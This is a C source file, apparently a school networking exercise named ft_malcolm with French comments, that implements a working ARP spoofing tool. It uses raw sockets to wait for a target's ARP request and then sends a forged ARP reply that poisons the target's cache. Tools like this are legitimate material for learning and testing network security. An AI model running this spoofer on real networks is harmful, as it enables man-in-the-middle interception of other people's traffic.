#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include "libft.h"

# define ARP_REQUEST 1
# define ARP_REPLY   2
# define ARP_HW_ETHER 1
# define ARP_PROTO_IP 0x0800

/* Disposition memoire exacte d'une trame Ethernet transportant un
 * message ARP (IPv4 sur Ethernet). packed = pas de padding, les octets
 * collent au format reseau. Sert a parser (recv) et a forger (send). */
typedef struct __attribute__((packed)) s_arp_packet
{
	uint8_t		eth_dst[6];		/* MAC destination Ethernet */
	uint8_t		eth_src[6];		/* MAC source Ethernet */
	uint16_t	eth_type;		/* 0x0806 = ARP */
	uint16_t	htype;			/* hardware type : 1 = Ethernet */
	uint16_t	ptype;			/* protocol type : 0x0800 = IPv4 */
	uint8_t		hlen;			/* longueur MAC = 6 */
	uint8_t		plen;			/* longueur IP = 4 */
	uint16_t	opcode;			/* 1 = request, 2 = reply */
	uint8_t		sender_mac[6];
	uint8_t		sender_ip[4];
	uint8_t		target_mac[6];
	uint8_t		target_ip[4];
}	t_arp_packet;

/* Seule variable globale autorisee : drapeau leve par le handler
 * Ctrl+C. volatile sig_atomic_t = lecture/ecriture sures depuis un
 * contexte de signal. */
volatile sig_atomic_t	g_stop = 0;

static void	handle_sigint(int sig)
{
	(void)sig;
	g_stop = 1;
}

/* sigaction sans SA_RESTART : interrompt recvfrom (EINTR) au lieu de
 * le relancer. ft_bzero remplace sigemptyset (non autorise). */
static void	setup_signals(void)
{
	struct sigaction	sa;

	ft_bzero(&sa, sizeof(sa));
	sa.sa_handler = handle_sigint;
	sigaction(SIGINT, &sa, NULL);
}

/* Adresses parsees et stockees sous forme binaire, pretes a etre
 * recopiees dans le paquet ARP plus tard, + contexte reseau. */
typedef struct s_config
{
	struct in_addr	source_ip;
	uint8_t			source_mac[6];
	struct in_addr	target_ip;
	uint8_t			target_mac[6];
	int				sockfd;
	unsigned int	ifindex;
	char			ifname[IFNAMSIZ];
}	t_config;

/* inet_pton : 1 = ok, 0 = format invalide, -1 = famille invalide. */
static int	parse_ip(const char *str, struct in_addr *out)
{
	return (inet_pton(AF_INET, str, out) == 1);
}

/* Valeur d'un chiffre hexa, ou -1 si le caractere n'en est pas un. */
static int	hex_value(char c)
{
	if (c >= '0' && c <= '9')
		return (c - '0');
	if (c >= 'a' && c <= 'f')
		return (c - 'a' + 10);
	if (c >= 'A' && c <= 'F')
		return (c - 'A' + 10);
	return (-1);
}

/* Parsing manuel d'une MAC au format strict xx:xx:xx:xx:xx:xx :
 * exactement 6 octets de 2 chiffres hexa separes par ':'. */
static int	parse_mac(const char *str, uint8_t *out)
{
	int	i;
	int	byte;
	int	hi;
	int	lo;

	i = 0;
	byte = 0;
	while (byte < 6)
	{
		hi = hex_value(str[i]);
		lo = hex_value(str[i + 1]);
		if (hi < 0 || lo < 0)
			return (0);
		out[byte] = (uint8_t)((hi << 4) | lo);
		i += 2;
		byte++;
		if (byte < 6)
		{
			if (str[i] != ':')
				return (0);
			i++;
		}
	}
	return (str[i] == '\0');
}

static int	parse_args(int argc, char **argv, t_config *cfg)
{
	if (argc != 5)
	{
		fprintf(stderr,
			"usage: %s <source ip> <source mac> <target ip> <target mac>\n",
			argv[0]);
		return (0);
	}
	if (!parse_ip(argv[1], &cfg->source_ip))
		return (fprintf(stderr,
				"ft_malcolm: unknown host or invalid IP address: (%s).\n",
				argv[1]), 0);
	if (!parse_mac(argv[2], cfg->source_mac))
		return (fprintf(stderr,
				"ft_malcolm: invalid mac address: (%s)\n", argv[2]), 0);
	if (!parse_ip(argv[3], &cfg->target_ip))
		return (fprintf(stderr,
				"ft_malcolm: unknown host or invalid IP address: (%s).\n",
				argv[3]), 0);
	if (!parse_mac(argv[4], cfg->target_mac))
		return (fprintf(stderr,
				"ft_malcolm: invalid mac address: (%s)\n", argv[4]), 0);
	return (1);
}

/* Interface utilisable = couche liaison (AF_PACKET), non loopback,
 * UP et RUNNING. On garde la premiere trouvee. */
static int	find_interface(t_config *cfg)
{
	struct ifaddrs	*ifaces;
	struct ifaddrs	*it;

	if (getifaddrs(&ifaces) == -1)
		return (fprintf(stderr, "ft_malcolm: getifaddrs: %s\n",
				strerror(errno)), 0);
	it = ifaces;
	while (it)
	{
		if (it->ifa_addr && it->ifa_addr->sa_family == AF_PACKET
			&& !(it->ifa_flags & IFF_LOOPBACK)
			&& (it->ifa_flags & IFF_UP) && (it->ifa_flags & IFF_RUNNING))
		{
			ft_strlcpy(cfg->ifname, it->ifa_name, IFNAMSIZ);
			cfg->ifindex = if_nametoindex(cfg->ifname);
			freeifaddrs(ifaces);
			printf("Found available interface: %s\n", cfg->ifname);
			return (1);
		}
		it = it->ifa_next;
	}
	freeifaddrs(ifaces);
	return (fprintf(stderr, "ft_malcolm: no available interface found\n"), 0);
}

/* Vrai si la trame recue est une requete ARP envoyee par l'IP target
 * et demandant l'IP source (celle qu'on va usurper). */
static int	is_target_request(t_config *cfg, const t_arp_packet *pkt)
{
	if (pkt->eth_type != htons(ETH_P_ARP))
		return (0);
	if (pkt->opcode != htons(ARP_REQUEST))
		return (0);
	if (ft_memcmp(pkt->sender_ip, &cfg->target_ip.s_addr, 4) != 0)
		return (0);
	if (ft_memcmp(pkt->target_ip, &cfg->source_ip.s_addr, 4) != 0)
		return (0);
	return (1);
}

/* Ecoute le trafic ARP jusqu'a capter la requete attendue. */
static int	listen_request(t_config *cfg)
{
	unsigned char	buf[ETH_FRAME_LEN];
	t_arp_packet	*pkt;
	ssize_t			n;
	char			ipstr[INET_ADDRSTRLEN];

	pkt = (t_arp_packet *)buf;
	while (!g_stop)
	{
		n = recvfrom(cfg->sockfd, buf, sizeof(buf), 0, NULL, NULL);
		if (n < 0)
		{
			if (errno == EINTR)
				continue ;
			return (fprintf(stderr, "ft_malcolm: recvfrom: %s\n",
					strerror(errno)), 0);
		}
		if ((size_t)n < sizeof(t_arp_packet))
			continue ;
		if (!is_target_request(cfg, pkt))
			continue ;
		inet_ntop(AF_INET, pkt->sender_ip, ipstr, sizeof(ipstr));
		printf("An ARP request has been broadcast.\n");
		printf("\tmac address of request: %02x:%02x:%02x:%02x:%02x:%02x\n",
			pkt->sender_mac[0], pkt->sender_mac[1], pkt->sender_mac[2],
			pkt->sender_mac[3], pkt->sender_mac[4], pkt->sender_mac[5]);
		printf("\tIP address of request: %s\n", ipstr);
		return (1);
	}
	return (-1);
}

static int	create_socket(t_config *cfg)
{
	cfg->sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (cfg->sockfd < 0)
		return (fprintf(stderr, "ft_malcolm: socket: %s\n",
				strerror(errno)), 0);
	return (1);
}

/* Restreint le socket a l'interface detectee. SO_BINDTODEVICE remplace
 * bind() (non autorise) : meme effet pour la reception. */
static int	bind_to_interface(t_config *cfg)
{
	if (setsockopt(cfg->sockfd, SOL_SOCKET, SO_BINDTODEVICE,
			cfg->ifname, ft_strlen(cfg->ifname) + 1) < 0)
		return (fprintf(stderr, "ft_malcolm: setsockopt: %s\n",
				strerror(errno)), 0);
	return (1);
}

/* Construit la reply spoofee : on affirme au target que l'IP source
 * est joignable a la MAC source (notre MAC usurpatrice). */
static void	build_reply(t_config *cfg, t_arp_packet *rep)
{
	ft_bzero(rep, sizeof(*rep));
	ft_memcpy(rep->eth_dst, cfg->target_mac, 6);
	ft_memcpy(rep->eth_src, cfg->source_mac, 6);
	rep->eth_type = htons(ETH_P_ARP);
	rep->htype = htons(ARP_HW_ETHER);
	rep->ptype = htons(ARP_PROTO_IP);
	rep->hlen = 6;
	rep->plen = 4;
	rep->opcode = htons(ARP_REPLY);
	ft_memcpy(rep->sender_mac, cfg->source_mac, 6);
	ft_memcpy(rep->sender_ip, &cfg->source_ip.s_addr, 4);
	ft_memcpy(rep->target_mac, cfg->target_mac, 6);
	ft_memcpy(rep->target_ip, &cfg->target_ip.s_addr, 4);
}

static int	send_reply(t_config *cfg)
{
	t_arp_packet		rep;
	struct sockaddr_ll	sll;

	build_reply(cfg, &rep);
	ft_bzero(&sll, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = cfg->ifindex;
	sll.sll_halen = 6;
	ft_memcpy(sll.sll_addr, cfg->target_mac, 6);
	printf("Now sending an ARP reply to the target address with spoofed "
		"source, please wait...\n");
	if (sendto(cfg->sockfd, &rep, sizeof(rep), 0,
			(struct sockaddr *)&sll, sizeof(sll)) < 0)
		return (fprintf(stderr, "ft_malcolm: sendto: %s\n",
				strerror(errno)), 0);
	printf("Sent an ARP reply packet, you may now check the arp table "
		"on the target.\n");
	return (1);
}

int	main(int argc, char **argv)
{
	t_config	cfg;
	int			r;

	if (!parse_args(argc, argv, &cfg))
		return (1);
	if (getuid() != 0)
		return (fprintf(stderr,
				"ft_malcolm: must be run as root (raw socket)\n"), 1);
	setup_signals();
	if (!create_socket(&cfg))
		return (1);
	if (!find_interface(&cfg))
		return (close(cfg.sockfd), 1);
	if (!bind_to_interface(&cfg))
		return (close(cfg.sockfd), 1);
	r = listen_request(&cfg);
	if (r == 0)
		return (close(cfg.sockfd), 1);
	if (r > 0 && !send_reply(&cfg))
		return (close(cfg.sockfd), 1);
	printf("Exiting program...\n");
	close(cfg.sockfd);
	return (0);
}
